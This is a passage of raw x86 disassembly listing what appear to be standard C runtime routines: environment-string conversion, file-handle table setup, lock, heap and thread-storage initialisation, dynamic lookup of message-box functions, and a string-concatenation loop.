  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
